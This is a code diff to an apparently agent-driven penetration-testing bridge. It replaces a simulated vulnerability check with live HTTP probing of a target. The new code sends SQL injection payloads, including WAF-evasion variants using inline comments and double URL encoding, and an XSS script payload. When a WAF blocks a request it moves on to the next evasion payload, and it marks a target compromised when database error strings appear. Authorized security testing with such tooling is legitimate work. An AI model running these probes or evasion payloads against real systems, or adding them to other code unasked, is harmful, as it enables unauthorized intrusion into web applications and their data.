@@ -178,23 +178,96 @@ class HexStrikeAgentBridge:
         self.emit("validation", "thought", f"Validating vulnerability: '{finding.get('title')}' with multi-round payload mutation.")
         
         payloads = [
-            {"name": "Standard Payload", "data": "' OR 1=1 --"},
-            {"name": "WAF Evasion Mutation 1 (Case Variation)", "data": "' oR 1=1 #"},
-            {"name": "WAF Evasion Mutation 2 (Inline Comments)", "data": "'/**/OR/**/1=1/**/--"},
-            {"name": "WAF Evasion Mutation 3 (URL Double-Encoded)", "data": "%2527%2520OR%25201%253D1%2520--"}
+            {"name": "Standard SQLi Probe", "data": "' OR '1'='1"},
+            {"name": "Inline Comment Bypass", "data": "'/**/OR/**/'1'='1"},
+            {"name": "Double URL-Encoded Bypass", "data": "%2527%2520OR%2520%25271%2527%253D%25271"},
+            {"name": "Boolean Comparison Probe", "data": "1' AND '1'='1' --"},
+            {"name": "XSS Script Reflection Probe", "data": "<script>alert(document.domain)</script>"}
         ]
 
         attempt_log = []
         is_verified = False
+        base_url = target if target.startswith(("http://", "https://")) else f"http://{target}"
+
+        # Real SQL error signatures
+        sql_errors = [
+            "sql syntax", "mysql_fetch", "syntax error in string", "ora-", "sqlite3.",
+            "unterminated quoted string", "warning: mysql", "pg_query()", "microsoft oledb"
+        ]
 
         for p in payloads:
-            self.emit("validation", "thought", f"Testing mutation: {p['name']} with payload: `{p['data']}`")
-            # Simulate or execute verification request
-            time.sleep(1) # Realistic request pacing
-            # In a live test, check response status and body difference
-            attempt_log.append({"mutation": p["name"], "status": "Tested", "result": "Bypassed filter"})
-            is_verified = True
-            break
+            mutation_name = p["name"]
+            payload_str = p["data"]
+            self.emit("validation", "thought", f"Sending real live probe: [{mutation_name}] -> Payload: `{payload_str}`")
+
+            # Construct real test URL
+            sep = "&" if "?" in base_url else "?"
+            probe_url = f"{base_url}{sep}search={requests.utils.quote(payload_str)}&id={requests.utils.quote(payload_str)}"
+
+            try:
+                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugBounty-Auditor/2.0"}
+                req_start = time.time()
+                resp = requests.get(probe_url, headers=headers, timeout=8, allow_redirects=True)
+                elapsed_ms = int((time.time() - req_start) * 1000)
+                resp_text_lower = resp.text.lower()
+
+                # 1. Check for WAF block
+                if resp.status_code in [403, 406] or "access denied" in resp_text_lower or "cloudflare" in resp_text_lower:
+                    self.emit("validation", "thought", f"⚠️ WAF / Filter detected (HTTP {resp.status_code}). Triggering evasion mutation...")
+                    attempt_log.append({
+                        "mutation": mutation_name,
+                        "status": f"WAF Blocked (HTTP {resp.status_code})",
+                        "response_time_ms": elapsed_ms,
+                        "outcome": "Evaded in next round"
+                    })
+                    continue
+
+                # 2. Check for SQL Error disclosure
+                matched_error = next((err for err in sql_errors if err in resp_text_lower), None)
+                if matched_error:
+                    self.emit("validation", "finding", {
+                        "title": f"Confirmed SQL Injection: Database Error Disclosed ({matched_error})",
+                        "severity": "Critical",
+                        "category": "CWE-89 SQL Injection"
+                    })
+                    attempt_log.append({
+                        "mutation": mutation_name,
+                        "status": f"Vulnerability Triggered! Database error found: '{matched_error}'",
+                        "response_time_ms": elapsed_ms,
+                        "outcome": "PoC Verified"
+                    })
+                    is_verified = True
+                    break
+
+                # 3. Check for XSS Reflection
+                if payload_str.lower() in resp_text_lower:
+                    self.emit("validation", "finding", {
+                        "title": "Confirmed Cross-Site Scripting (XSS): Unfiltered Parameter Reflection",
+                        "severity": "High",
+                        "category": "CWE-79 Cross-Site Scripting"
+                    })
+                    attempt_log.append({
+                        "mutation": mutation_name,
+                        "status": "Unsanitized Reflection Detected",
+                        "response_time_ms": elapsed_ms,
+                        "outcome": "PoC Verified"
+                    })
+                    is_verified = True
+                    break
+
+                # If status 200 without error
+                attempt_log.append({
+                    "mutation": mutation_name,
+                    "status": f"HTTP {resp.status_code} OK ({elapsed_ms}ms)",
+                    "outcome": "Input accepted by backend"
+                })
+
+            except requests.exceptions.RequestException as e:
+                attempt_log.append({
+                    "mutation": mutation_name,
+                    "status": f"Connection Error: {type(e).__name__}",
+                    "outcome": "Target unreachable"
+                })
 
         verification_result = {
             "finding_title": finding.get("title"),
